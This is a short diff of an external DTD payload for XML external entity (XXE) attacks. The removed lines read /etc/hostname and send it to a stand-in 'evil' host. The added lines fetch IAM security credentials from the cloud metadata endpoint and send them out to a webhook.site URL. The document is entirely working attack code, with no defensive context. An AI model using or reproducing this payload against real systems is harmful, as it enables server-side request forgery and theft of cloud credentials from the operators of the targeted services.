@@ -1,6 +1,3 @@
-<!-- Load the contents of a sensitive file into a variable -->
-<!ENTITY % payload SYSTEM "file:///etc/hostname">
-<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
-%param1;
-%external;
+<!ENTITY % meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<!ENTITY % send "<!ENTITY exfil SYSTEM 'https://webhook.site/3075fd0e-8044-49ee-8a30-29e3ad5d0b04/cloud?data=%meta;'>">
+%send;
